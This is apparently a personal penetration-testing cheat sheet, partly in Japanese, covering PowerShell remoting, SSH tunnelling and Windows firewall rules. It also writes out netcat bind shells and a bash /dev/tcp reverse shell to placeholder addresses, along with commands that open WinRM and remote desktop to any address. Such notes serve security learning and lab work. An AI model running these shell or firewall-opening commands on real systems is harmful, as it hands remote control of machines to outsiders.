# penetration-wiki

## PS-Session

### Server Settings

- username = `easyduck`
- password = `verystrongpassword`
- hostname = `rhostname`
- ipaddress = `xxx.xxx.xxx.xxx`

```pwsh
Enable-PSRemoting
Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP-PUBLIC" -RemoteAddress Any
net start WinRM
```

### Client

pattern 1

```pwsh
Enter-PSSession -ComputerName "xxx.xxx.xxx.xxx" -Credential "easyduck"
```

pattern 2

```pwsh
Enter-PSSession -ComputerName "hostname"-Credential "easyduck"
```

## Netcat

- RHOST_ip: `xxx.xxx.xxx.xxx`
- LHOST_ip: `yyy.yyy.yyy.yyy`
- RHOST_open_port: `4444`
- LHOST_open_port: `5555`

### bindshell

1. RHOST : `nc -nlvp 4444 -e cmd.exe`
1. LHOST : `nc -nv xxx.xxx.xxx.xxx 4444`

### reverseshell

1. RHOST : `bash -i >& /dev/tcp/yyy.yyy.yyy.yyy/5555 0>&1`
1. LHOST : `nc -nlvp 5555`

## Server Settings

- RPORT = `4444`
- RHOST = `xxx.xxx.xxx.xxx`

```bash
nc -lvp 4444 -e /bin/sh
nc -lvp 4444 -e cmd.exe
```

> **Note**
> must not `cmd` only


## Client

```bash
nc xxx.xxx.xxx.xxx 4444
```

## SSH Port Forwarding

### Local forward

remoteを経由してローカルにあるツールをtargetに対して使いたい場合

```
ssh -fNT -L xxx:target:zzz remote
```

### Remote forward

localを経由して外部にあるtargetにremoteからアクセスさせたい場合

```
ssh -fNT -R xxx:remote:zzz target
```

### Dynamic portforwarding

local を起点とし、remote にsshdが立っているとする。 このとき下記のように-Dオプションを指定して接続することで、local から見たlocalhost:1080がSOCKS Proxyとなる。 なお、SOCKS Proxyのポート番号はtcp/1080が標準的に用いられる [RFC 1928]。

on user@local

```
ssh -D 1080 user@remote
```

ここで local のブラウザ設定からlocalhost:1080をSOCKS Proxyとして指定すると、ブラウザからのすべてのアクセスが remote を経由したアクセスとなる.

### SSH Compress

```bash
ssh -C --o CompressionLevel=9
```

## Windows Firewall Settings

### with pwsh

https://docs.microsoft.com/ja-jp/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security-administration-with-windows-powershell

```pwsh
Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP-PUBLIC" -RemoteAddress Any
New-NetFirewallRule -Name <名前> -DisplayName <表示名> -Enabled true -Profile <有効にするプロファイル> -Action Allow -LocalAddress Any -RemoteAddress Any -Protocol TCP -LocalPort 10050 -RemotePort Any
New-NetFirewallRule -name 'DPF' -displayname 'DPF' -enable true -profile any -action allow -LocalAddress Any -RemoteAddress Any -Protocol TCP -LocalPort 1080 -RemotePort Any
# OnWorkgroup
Get-NetFirewallRule -Name FPS-ICMP4-ERQ-In | Set-NetFirewallRule -enabled true
Get-NetFirewallRule -Name FPS-ICMP6-ERQ-In | Set-NetFirewallRule -enabled true
# OnDomain
Get-NetFirewallRule -name  FPS-ICMP4-ERQ-In-NoScope | Set-NetFirewallRule -enable true
Get-NetFirewallRule -name  FPS-ICMP6-ERQ-In-NoScope | Set-NetFirewallRule -enable true

Get-NetFirewallRule | ? Name -match "FPS-ICMP.-ERQ-In" | Set-NetFirewallRule -Enabled True
```

### with batch

https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior

```batch
netsh advfirewall firewall add rule name="My Application" dir=in action=allow program="C:\MyApp\MyApp.exe" enable=yes

netsh advfirewall firewall add rule name="My Application" dir=in action=allow program= "C:\MyApp\MyApp.exe" enable=yes remoteip=157.60.0.1,172.16.0.0/16,LocalSubnet profile=domain

netsh advfirewall firewall add rule name="My Application" dir=in action=allow program= "C:\MyApp\MyApp.exe" enable=yes remoteip=157.60.0.1,172.16.0.0/16,LocalSubnet profile=domain
netsh advfirewall firewall add rule name="My Application" dir=in action=allow program="C:\MyApp\MyApp.exe" enable=yes remoteip=157.60.0.1,172.16.0.0/16,LocalSubnet profile=private

netsh advfirewall firewall add rule name= "Open Port 80" dir=in action=allow protocol=TCP localport=80

netsh advfirewall firewall delete rule name= rule name program="C:\MyApp\MyApp.exe"

netsh advfirewall firewall delete rule name= rule name protocol=udp localport=500
  
netsh advfirewall reset
    
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
    
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
    	
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=domain
  
netsh advfirewall firewall add rule name="ICMP Allow incoming V4 echo request" protocol=icmpv4:8,any dir=in action=allow
  
netsh advfirewall firewall add rule name= "All ICMP V4" protocol=icmpv4:any,any dir=in action=allow
  
netsh advfirewall firewall add rule name="Block Type 13 ICMP V4" protocol=icmpv4:13,any dir=in action=block

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=private
```
